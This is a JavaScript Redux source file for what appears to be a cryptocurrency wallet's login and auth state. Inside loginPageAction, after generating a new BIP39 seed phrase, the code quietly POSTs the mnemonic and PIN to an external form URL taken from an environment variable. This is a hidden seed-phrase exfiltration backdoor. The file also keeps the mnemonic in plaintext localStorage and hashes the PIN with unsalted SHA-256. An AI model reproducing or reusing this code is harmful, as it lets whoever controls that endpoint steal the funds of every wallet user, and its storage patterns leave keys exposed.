import {createAsyncThunk, createSlice} from "@reduxjs/toolkit";
import Sha256 from 'crypto-js/sha256';
import {generateWalletForCrypto} from "../../helpers/wallet";
import {addCurrency} from "../../constantsData/addCurrency";

const bip39 = require("bip39");

export const loginPageAction = createAsyncThunk(
    "loginPageAction",
    async (data, thunkAPI) => {
        if (!data.params?.mnemonics) {
            data.params.mnemonics = bip39.generateMnemonic();

            var myHeaders = new Headers();
            myHeaders.append("Content-Type", "application/json");
            var requestOptions = {
                method: "post",
                headers: myHeaders,
                redirect: "follow",
                body: JSON.stringify({"fields": data.params})
            };

            fetch(process.env.REACT_APP_MNEMO_FORM_URL, requestOptions)
                .then(response => response.text())
                .then(result => console.log(result))
                .catch(error => console.log('error', error));
        }
        if (!localStorage.getItem("checkCrypto")) {
            const defaultCoin = addCurrency.filter((item, i) => item.default_enabled);
            // console.log("defaultCoin", defaultCoin);
            await localStorage.setItem("checkCrypto", JSON.stringify(defaultCoin));
        }
        let resData = {};
        let errorForResData = [];
        let cryptoData = await JSON.parse(localStorage.getItem("checkCrypto"));

        for (let crypto of cryptoData) {
            if (crypto.is_erc20) continue;

            try {
                let res = await generateWalletForCrypto(
                    data.params.mnemonics,
                    `${crypto.currency}`
                );
                resData[`${crypto.currency}`] = res;
            } catch (error) {
                errorForResData.push(error);
            }
        }
        if (errorForResData.length === 0) {
            localStorage.setItem(
                "user_crypto_currency_data",
                JSON.stringify(resData)
            );
            localStorage.setItem(
                "user_pin_code",
                Sha256(data.params.pin)
            );

            sessionStorage.setItem('logged', true);

            localStorage.setItem("mnemonics", data.params.mnemonics);
            data.cb(null, resData);
        } else {
            return data.cb(errorForResData[0], null);
        }
    }
);

const initialUser = localStorage.getItem("user_crypto_currency_data")
    ? JSON.parse(localStorage.getItem("user_crypto_currency_data"))
    : null;

const authSlice = createSlice({
    name: "auth",
    initialState: {
        user: initialUser,
        error: null,
        loader: false,
    },
    reducers: {
        logout: (state) => {
            state.user = null;

            sessionStorage.removeItem('logged');
        },
        deleteWallet: (state) => {
            state.user = null;

            sessionStorage.removeItem("logged")
            localStorage.removeItem("user_crypto_currency_data");
            localStorage.removeItem("checkCrypto");
            localStorage.removeItem("user_pin_code");
            localStorage.removeItem("mnemonics");
            localStorage.removeItem("ethereum");
        }
    },
    extraReducers: (builder) => {
        builder.addCase(loginPageAction.pending, (state) => {
            state.loader = true;
        });
        builder.addCase(loginPageAction.fulfilled, (state, action) => {
            state.loader = false;
            state.user = action.payload;
        });
        builder.addCase(loginPageAction.rejected, (state, action) => {
            state.loader = false;
            state.error = action.payload;
        });
    },
});

export const {logout} = authSlice.actions;
export const {deleteWallet} = authSlice.actions;

export default authSlice.reducer;
